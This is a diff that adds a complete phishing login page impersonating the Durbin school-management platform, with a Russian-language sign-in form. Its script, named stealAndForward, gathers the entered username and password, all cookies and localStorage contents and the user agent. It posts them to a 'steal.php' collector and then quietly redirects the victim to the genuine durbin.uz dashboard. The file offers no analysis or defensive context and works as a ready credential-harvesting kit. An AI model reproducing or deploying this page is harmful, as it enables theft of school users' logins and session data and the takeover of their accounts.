@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Durbin - Kirish</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            width: 100%;
+            max-width: 1200px;
+            min-height: 600px;
+            background: white;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.15);
+            margin: 20px;
+        }
+        .brand {
+            flex: 1;
+            background: linear-gradient(145deg, #1a237e, #0d47a1);
+            padding: 48px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        .brand::after {
+            content: '';
+            position: absolute;
+            top: -30%;
+            right: -30%;
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .brand .logo {
+            width: 140px;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 1;
+        }
+        .brand h1 {
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .brand p {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.6;
+            max-width: 380px;
+            position: relative;
+            z-index: 1;
+        }
+        .form-side {
+            flex: 1;
+            padding: 48px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            background: white;
+        }
+        .form-side .mobile-logo {
+            display: none;
+            width: 100px;
+            margin-bottom: 30px;
+        }
+        .form-side h2 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+        }
+        .form-side .sub {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            font-size: 14px;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d0d7de;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #f8f9fa;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(26,115,232,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover {
+            background: #1557b0;
+        }
+        .footer-text {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 13px;
+            color: #888;
+        }
+        .footer-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        @media (max-width: 768px) {
+            .container { flex-direction: column; max-width: 400px; }
+            .brand { padding: 30px 20px; min-height: 200px; }
+            .brand h1 { font-size: 24px; }
+            .form-side { padding: 30px 20px; }
+            .form-side .mobile-logo { display: block; }
+            .brand .logo { display: none; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="brand">
+        <img class="logo" src="https://durbin.uz/assets/svgs/logo-white.svg" alt="Durbin" onerror="this.style.display='none'">
+        <h1>DURBIN – ПРИБЛИЖАЕТ К ОБРАЗОВАНИЮ!</h1>
+        <p>Начните цифровизацию вашей школы. Управляйте уроками, учениками и процессами на единой платформе.</p>
+    </div>
+
+    <div class="form-side">
+        <img class="mobile-logo" src="https://durbin.uz/assets/svgs/logo.svg" alt="Durbin" onerror="this.style.display='none'">
+        <h2>Добро пожаловать в систему!</h2>
+        <div class="sub">Войдите, чтобы продолжить</div>
+
+        <form id="loginForm" onsubmit="stealAndForward(event)">
+            <div class="form-group">
+                <label for="username">Логин</label>
+                <input type="text" id="username" name="username" placeholder="Введите логин" required autofocus>
+            </div>
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+            </div>
+            <button type="submit" class="btn">Войти</button>
+        </form>
+
+        <div class="footer-text">
+            Забыли пароль? <a href="#">Обратитесь к администратору школы.</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    function stealAndForward(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const cookies = document.cookie;
+        let localData = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                localData[key] = localStorage.getItem(key);
+            }
+        } catch(e) {}
+
+        const payload = {
+            username: username,
+            password: password,
+            cookies: cookies,
+            localStorage: localData,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString()
+        };
+
+        fetch('steal.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+
+        window.location.href = 'https://durbin.uz/dashboard';
+    }
+</script>
+</body>
+</html>
